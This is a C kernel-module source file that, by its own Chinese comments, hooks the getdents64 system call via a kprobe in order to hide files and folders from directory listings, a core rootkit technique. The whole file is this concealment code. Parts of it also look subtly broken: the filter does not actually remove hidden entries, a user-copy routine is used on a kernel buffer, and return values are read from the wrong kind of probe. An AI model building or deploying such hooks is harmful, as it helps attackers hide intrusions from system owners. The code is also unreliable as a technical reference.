/*
 * vfs_hook.c - VFS 层 Hook 实现
 * 用于隐藏文件/文件夹
 * 兼容 Linux 5.10 - 6.12
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/syscalls.h>

#include "hook.h"

MODULE_LICENSE("GPL");

/* getdents64 pre_handler */
static int pre_getdents64(struct kprobe *p, struct pt_regs *regs)
{
    return 0;
}

/* getdents64 post_handler */
static void post_getdents64(struct kprobe *p, struct pt_regs *regs,
                            unsigned long flags)
{
    struct linux_dirent64 __user *dirent;
    int count;

#if defined(CONFIG_ARM64)
    dirent = (struct linux_dirent64 __user *)regs->regs[1];
    count = (int)regs->regs[2];
#else
    dirent = (struct linux_dirent64 __user *)regs->si;
    count = (int)regs->dx;
#endif

    if (count <= 0)
        return;

    /* 过滤目录条目 */
    struct linux_dirent64 *kbuf, *current, *prev = NULL;
    int total = 0;
    int new_count = 0;
    char name[256];

    kbuf = kzalloc(count + 4096, GFP_ATOMIC);
    if (!kbuf)
        return;

    if (copy_from_user(kbuf, dirent, count)) {
        kfree(kbuf);
        return;
    }

    current = kbuf;
    total = count;
    new_count = 0;
    prev = NULL;

    while (total > 0) {
        int reclen = current->d_reclen;

        if (reclen <= 0 || reclen > total)
            break;

        memset(name, 0, sizeof(name));
        strncpy_from_user(name, current->d_name,
                         min(reclen - offsetof(struct linux_dirent64, d_name),
                             (int)(sizeof(name) - 1)));

        if (!is_hidden(name, false)) {
            prev = current;
            new_count += reclen;
        }

        total -= reclen;
        current = (struct linux_dirent64 *)((char *)current + reclen);
    }

    if (new_count > 0 && new_count <= count) {
        if (!copy_to_user(dirent, kbuf, new_count)) {
            /* 更新返回值寄存器 */
#if defined(CONFIG_ARM64)
            regs->regs[0] = new_count;
#else
            regs->ax = new_count;
#endif
        }
    }

    kfree(kbuf);
}

/* Kprobe 定义 */
static struct kprobe kp_getdents64 = {
    .symbol_name = "sys_getdents64",
    .pre_handler = pre_getdents64,
    .post_handler = post_getdents64,
};

int vfs_hook_init(void)
{
    int ret;

    ret = register_kprobe(&kp_getdents64);
    if (ret < 0) {
        pr_err("hook: failed to register getdents64 kprobe: %d\n", ret);
        return ret;
    }

    pr_info("hook: vfs hook registered (getdents64)\n");
    return 0;
}

void vfs_hook_exit(void)
{
    unregister_kprobe(&kp_getdents64);
    pr_info("hook: vfs hook unregistered\n");
}
